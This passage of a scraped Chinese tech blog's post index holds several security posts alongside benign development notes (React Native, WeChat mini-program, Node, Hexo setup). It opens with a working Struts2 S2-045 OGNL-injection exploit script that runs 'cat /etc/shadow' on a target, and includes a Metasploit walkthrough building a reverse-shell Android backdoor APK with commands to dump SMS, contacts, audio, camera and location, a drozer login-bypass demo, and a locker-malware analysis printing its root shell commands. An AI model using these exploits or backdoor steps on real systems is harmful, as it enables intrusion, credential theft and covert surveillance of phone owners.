目前官方已确认(漏洞编号S2-045) poc 1234567891011121314151617#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openers def poc(): register_openers() datagen, header = multipart_encode(&#123;\"image1\": open(\"tmp.txt\", \"rb\")&#125;) header[\"User-Agent\"]=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\" header[\"Content-Type\"]=\"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/shadow').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\" request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read() poc() 末尾希望这次各个厂商能及时防范，不要想前几年一样造成大量的数据泄漏(某东12G)","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"React-Native电商项目源码","date":"2017-02-23T05:57:29.000Z","path":"2017/02/23/diary-2017-0223-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于react-native就不多介绍了，这个项目去年的时候就开始写了，中间因为公司的一些项目原因耽搁了一段时间，所以一直到现在才发出来.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，主要是布局方面，代码简洁明了，适合初识react-native的同学了解和学习&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于没有ios设备，所以没有对ios设备做适配，另外感谢小马哥提供的学习资料素材。 &nbsp;&nbsp;项目用的es6 接口 接口方面全部用的本地json文件。 库 react-native-tab-navigator 运行 npm install react-native run-android 演示 项目地址 https://github.com/Y00z/react-navie_store","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"React-Native","slug":"React-Native","permalink":"http://y00z.github.io/tags/React-Native/"}]},{"title":"微信小程序app源码","date":"2017-02-06T02:16:04.000Z","path":"2017/02/06/diary-2017-0206-01/","text":"前言 小程序已经出来一段时间了，对于小程序就不做多评价了，网上很多介绍文章。我们公司的这个小程序项目是一个演示项目，介绍公司产品的主要功能，代码很简单。微信小程序本身就很简单，和react-native很多相似处。为防止数据泄漏，我就把接口换成了死数据。使用到了下拉刷新，上拉加载更多，wx-charts框架等 登录 主页 图表 菜单 列表 详情 源码 https://github.com/Y00z/wx_acm","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"小程序","slug":"小程序","permalink":"http://y00z.github.io/tags/小程序/"}]},{"title":"drozer对app安全测试","date":"2017-02-04T03:44:08.000Z","path":"2017/02/04/diary-2017-0204-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现一款不错的Android安全测试框架&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其官方文档说道：“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Web世界已经有了许多安全测试工具了，我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。 配置环境 电脑和手机都需要安装drozer下载地址https://www.mwrinfosecurity.com/products/drozer/community-edition/我电脑是windows的，安装完毕后，dos切换到drozer安装目录。 连接手机 然后手机上安装好drozer并且开启server默认端口31415 然后手机打开调试usb连接电脑，输入指令做端口转发 adb forward tcp:31415 tcp:31415必须在adb devices 有显示手机设备才可以。dos中，在drozer安装目录输入指令drozer console connect连接成功了。 功能介绍所有的模块 list查看框架所有的模块 run app.package.list列出手机上所有应用包名 查看包名 run app.package.listps: 为了一些有心人士,所以打了码,不好意思。加上-f参数，搜索特定包名支持模糊搜索： run app.package.list -f (string to be searched) 查看包详情 run app.package.info –a (package name) 扫描攻击面 扫描指定app的攻击面。 run app.package.attacksurface (package name)可以看到有3个暴露的activity，现在我们需要找出暴露activity的名字并检查是否有敏感信息 查看暴露的页面 run app.activity.info –a (package name)如果暴露的页面是需要登录之后获取一些操作之后才能看到的页面。那么用drozer绕过登录认证，直接打开这个页面。 打开暴露的页面 run app.activity.start –component (package name) (activity name)会直接启动该activity。就这样我们成功绕过了登录认证。由于我在页面写了检测到如果没有登录，就重新跳到登录页面，所以有弹出框。 漏洞原因 在AndroidManifest.xml中activity有一个属性android:exported，当这个属性为true的时候，表示该组件可以被其他组件调用。所以直接不写这个属性就可以了，默认false。ps:其实这个app本来是没这个属性，我为了方便演示才加上的。","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"对安卓锁机恶意程序反编译分析","date":"2017-01-08T06:08:50.000Z","path":"2017/01/08/diary-2017-0108-01/","text":"前言 这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。 正文 锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码2、设置一个view至栈顶端。 第一种 在上一篇博文中的安全卫士中有用到这个设备管理器。原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。 第二种 这种也就是这篇博文主要讲的了。ApkTool用来逆向反编译。主要文件，混淆了方法名和类名。重要的是ijm-x86.so这个so文件,后面有讲解先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码123456789101112131415161718192021@Overrideprotected void onCreate(Bundle paramBundle)&#123; LogCatBroadcaster.start(this); super.onCreate(paramBundle); setContentView(2130903040); this.b = ((Button)findViewById(2131099651)); this.t = ((EditText)findViewById(0)); Button localButton = this.b; ButtonClickListener localButtonClickListener = new ButtonClickListener(); localButton.setOnClickListener(localButtonClickListener); try &#123; StringBuffer localStringBuffer = new StringBuffer(); d(this.path + \"/zihao.l\"); return; &#125; catch (IOException localIOException) &#123; &#125;&#125; this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。 123456789101112131415161718private void d(String paramString) throws IOException&#123; FileOutputStream localFileOutputStream = new FileOutputStream(paramString); InputStream localInputStream = getAssets().open(\"ijm-x86.so\"); byte[] arrayOfByte = new byte[1024]; for (int i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte)) &#123; if (i &lt;= 0) &#123; localFileOutputStream.flush(); localInputStream.close(); localFileOutputStream.close(); return; &#125; localFileOutputStream.write(arrayOfByte, 0, i); &#125;&#125; 把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l再来看看ButtonClickListener的点击事件。123456789101112131415 private final class ButtonClickListener implements View.OnClickListener&#123; public ButtonClickListener() &#123; &#125; @Override public void onClick(View paramView) &#123; b localb = new b(); localb.rootShell(); a.deleteFile(c.this.file); &#125;&#125; 执行了b对象中的rootShell方法。我们继续跟进。1234void rootShell()&#123; execCommand(new String[] &#123; \"mount -o rw,remount /system\", \"mount -o rw,remount /system/app\", \"cp /sdcard/zihao.l /system/app/\", \"chmod 777 /system/app/zihao.l\", \"mv /system/app/zihao.l /system/app/zihao.apk\", \"chmod 644 /system/app/zihao.apk\", \"reboot\" &#125;, true);&#125; 很明显，这个是执行shell命令的代码。先把/system 和 /system/app 设置可读可写。再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。最后再重启。/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。 分析第二层 同样的手法，找到app的入口Activity. 1234567@Overridepublic void onCreate(Bundle paramBundle)&#123; LogCatBroadcaster.start(this); super.onCreate(paramBundle); activiteDevice();&#125; 继续跟进 123456789101112131415161718private void activiteDevice()&#123; Intent localIntent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\"); NoClassDefFoundError localNoClassDefFoundError; try &#123; Class localClass = Class.forName(\"com.h.MyAdmin\"); ComponentName localComponentName = new ComponentName(this, localClass); localIntent.putExtra(\"android.app.extra.DEVICE_ADMIN\", localComponentName); startActivityForResult(localIntent, 0); return; &#125; catch (ClassNotFoundException localClassNotFoundException) &#123; localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage()); &#125; throw localNoClassDefFoundError;&#125; 操作打开激活设备管理器的界面 来看看MyAdmin里面的代码。 123456789101112131415161718192021@Override public void onEnabled(Context paramContext, Intent paramIntent) &#123; String str = Integer.toString(1997); NoClassDefFoundError localNoClassDefFoundError; try &#123; Class localClass = Class.forName(\"com.h.s\"); Intent localIntent = new Intent(paramContext, localClass); localIntent.setFlags(268435456); paramContext.startService(localIntent); getManager(paramContext).resetPassword(str, 0); super.onEnabled(paramContext, paramIntent); return; &#125; catch (ClassNotFoundException localClassNotFoundException) &#123; localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage()); &#125; throw localNoClassDefFoundError; &#125; 用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。跟进看看这个服务做了些什么。s里面杂乱代码太多，我们直接来看主要的。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private void c()&#123; WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams(); this.wmParams = localLayoutParams; Application localApplication = getApplication(); getApplication(); this.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE)); this.wmParams.type = 2010; this.wmParams.format = 1; this.wmParams.flags = 1280; this.wmParams.gravity = 49; this.wmParams.x = 0; this.wmParams.y = 0; this.wmParams.width = -1; this.wmParams.height = -1; this.mFloatLayout = LayoutInflater.from(getApplication()).inflate(2130903041, (ViewGroup)null); MediaPlayer localMediaPlayer = MediaPlayer.create(this, 2131099648); localMediaPlayer.setLooping(true); localMediaPlayer.start(); this.mWindowManager.addView(this.mFloatLayout, this.wmParams); this.bt = ((Button)this.mFloatLayout.findViewById(2131361794)); this.ed = ((EditText)this.mFloatLayout.findViewById(2131361792)); this.tv = ((TextView)this.mFloatLayout.findViewById(2131361793)); try &#123; this.ed.setHint(\"宝贝在这输入密码！\"); this.tv.append(\"恭喜中奖\"); Button localButton = this.bt; 100000001 local100000001 = new View.OnClickListener() &#123; @Override public void onClick(View paramView) &#123; try &#123; if (s.this.ed.getText().toString().equals(s.this.des.decrypt(s.this.share.getString(\"passw\", \"\")))) &#123; s.access$L1000001(s.this).removeView(s.access$L1000002(s.this)); s.this.stopSelf(); &#125; return; &#125; catch (Exception localException) &#123; &#125; &#125; &#125;; localButton.setOnClickListener(local100000001); &#125; catch (Exception localException1) &#123; try &#123; TextView localTextView = this.tv; StringBuffer localStringBuffer1 = new StringBuffer(); StringBuffer localStringBuffer2 = new StringBuffer(); localTextView.append(localStringBuffer2.append(\"\\n\").append(this.des.decrypt(\"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c\")).toString() + this.share.getLong(\"m\", 0)); return; localException1 = localException1; &#125; catch (Exception localException2) &#123; &#125; &#125;&#125; 把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。重点：布局文件的type和flags属性。可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。 总结 这个锁机程序的运行流程，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。由于已经是系统应用了，所以双清、恢复出厂化设置都清除不了 解决办法。 手机必须是开启usb调试，连接电脑adb shell进入手机base shell，进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。 末尾 为了不让恶意程序流传，我就不分享源程序了。不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。链接: http://pan.baidu.com/s/1mi0roJA 密码: 6xqi","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"反编译","slug":"反编译","permalink":"http://y00z.github.io/tags/反编译/"}]},{"title":"安卓源码三连发","date":"2017-01-06T06:11:27.000Z","path":"2017/01/06/diary-2017-0106-01/","text":"前言 早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.当时正好移动设备特别火,所以决定入坑安卓开发了.当时给自己定下的目标是先学习java，javaweb，然后是android. 学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习. 手机安全卫士 https://github.com/Y00z/android_security 新闻客户端 https://github.com/Y00z/android_news 应用市场 https://github.com/Y00z/android_googlePlay 尾声 移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.门槛不高，第三方框架和解决方案太多太多了.个人目前正在学习研究nodejs，react，react-native，python.欢迎志向相同的朋友交流一起学习","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"node开发电影站项目","date":"2016-12-20T08:45:59.000Z","path":"2016/12/20/diary-2016-1220-01/","text":"NodeJs + MongoDb + express4搭建电影站简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。 数据库 MongoDb web框架 express4 前端 ejs 构建 grunt 前端 观看电影，查看电影详情，以及评论，还有分页搜索,登录退出等。 后端 对电影和分类进行添加和编辑以及删除，也可以添加删除用户,持久化session等。同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。需要用户的role大于50也就是管理员权限才可以访问后台 运行* npm install * mongod --dbpath D:\\db * grunt 首页 添加电影 电影列表 分页 搜索 项目地址 https://github.com/Y00z/nodejs_movie","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://y00z.github.io/tags/NodeJs/"}]},{"title":"msf渗透android并植入后门","date":"2016-12-19T07:32:08.000Z","path":"2016/12/19/diary-2016-1219-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 。团队合作，在Metasploit和综合报告提出了他们的发现。 环境 BackBox、kali linux、或者BackTrack(kali linux的前身) 一台安卓设备 环境不说太多介绍了，直接来实战。 生成payload装好环境后查看自己的ip 生成一个payload msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk p 设置要使用的payload LHOST 设置用来接收反弹连接的主机 LPORT 设置用来接收反弹连接的端口 很小，才8kb如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。生成的apk放到手机上安装，安装完成后是这样的。 反弹shell 启动msf依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致) * use exploit/multi/handler * set payload android/meterpreter/reverse_tcp * set LHOST 192.168.0.18 * set LPORT 2333 设置完毕后就可以输入 exploit 来执行攻击了 可以看到msf会一直在监听本机的2333端口，等待着目标连接上线然后我打开我们刚刚安装的打开后会连接到msf这样我们就拿到了手机的shell 控制指令 我来介绍几个有意思的指令。 * check_root #查看是否root * dump_calllog #下载通讯记录 * dump_contacts #下载联系人 * dump_sms #下载短信 * send_sms #发送短信 * record_mic #录音 * webcam_list #查看手机摄像头 * webcam_snap #拍照 * webcam_stream #连续拍照 * geolocate #获取目标地理位置 * upload #上传文件到手机 * download #下载手机上的文件 * shell #进入手机的bash shell check_root(检测root) 是root的设备 dump_contacts(下载联系人) 57个联系人 dump_sms(下载短信) 1271条短信 send_sms(发送短信) -d目标电话号码 -t 短信内容 record_mic(录音) -d 录音的秒数音频文件会自动保存在/var/www/html/目录下 webcam_list(检测摄像头) 2:前置摄像头1:后置摄像头 webcam_snap(拍照) -i 选择使用哪个摄像头拍照手机息屏的时候也可以拍照 webcam_stream(连续拍照) -i 指定摄像头 -d 拍照间隔(默认1800毫秒)使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片 geolocate(获取地理位置) upload(上传文件到手机) download(下载文件到手机) shell(进入手机bash shell) 最后 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"hexo+github搭建免费个人博客","date":"2016-12-14T17:06:22.000Z","path":"2016/12/15/diary-2016-1215-01/","text":"前言 一直想着有时间就把自己会的技术分享出来，可是一直拖啊拖，这次搭建了个博客，决心要share出来。 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js. 一,搭建平台配置环境 安装Node（必须） 安装Git（必须） 申请github帐号（必须） 这三个就不用多说了。 配置github &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting 往下拉有个launch automatic page generator 输入标题和内容 完成后选择样式主题 选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果https://zhangsan.github.io/ 二,hexo生成博客安装hexo* npm install -g hexo * npm install hexo-deployer-git --save 安装成功后输入命令 hexo init blogname ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了 设置主题 主题: https://hexo.io/themes/ 找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中 * git clone https://github.com/iissnan/hexo-theme-next.git themes/next 把hexo主题克隆到博客文件夹中。然后再打开博客主页中的_config.yml，找到theme,后面加上我们主题的名字如theme: next最后运行hexo s可以来查看效果了浏览器输入 http://localhost:4000查看效果。 三,同步github设置ssh key 首先进入到C:\\Users\\username\\.ssh文件夹中，把里面文件都删掉然后输入命令输入bash(配置git环境才有),进入bash shell再来依次输入命令生成ssh * ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车) * ssh-agent –s * ssh-add ~/.ssh/id_rsa * eval `ssh-agent -s * ssh-add 如果输出了ssh目录呢,就说明生成成功了 进入C:\\Users\\username\\.ssh目录,id_rsa.pub文件就是我们的key。 github设置ssh key 打开github的setting下面有一个SSH and GPG keys然后New ssh key，就可以输入标题和key了标题随意，key就是C:\\Users\\username\\.ssh\\id_rsa.pub中的内容，全部复制粘贴过去。Add SSH key 就ok了 测试 在bash shell中输入ssh git@github.com 注意：提示yes or no的话，一定要输入yes，千万别直接回车。如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了 hexo同步到github 打开blog文件夹中的_config.yml,在最后一行加上 * deploy: * type: git * repository: https://github.com/Y00z/y00z.github.io.git * branch: master repository中的地址是上面创建的仓库的地址 注意:type: 和repository: 以及branch:冒号后面有一个空格。最后hexo就可以同步到github上了每次同步到github的命令行 hexo clean &amp;&amp; hexo g &amp;&amp; hexo d最后户可以进入your_github_name.github.io 查看效果了。 其他更新 更新hexo： npm update -g hexo 更新主题： cd themes/你的主题 git pull 更新插件： npm update hexo命令 hexo new “postName” #新建文章 hexo new page “pageName” #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口 hexo deploy #将.deploy目录部署到GitHub hexo clean #清除缓存","tags":[{"name":"hexo","slug":"hexo","permalink":"http://y00z.github.io/tags/hexo/"}]}]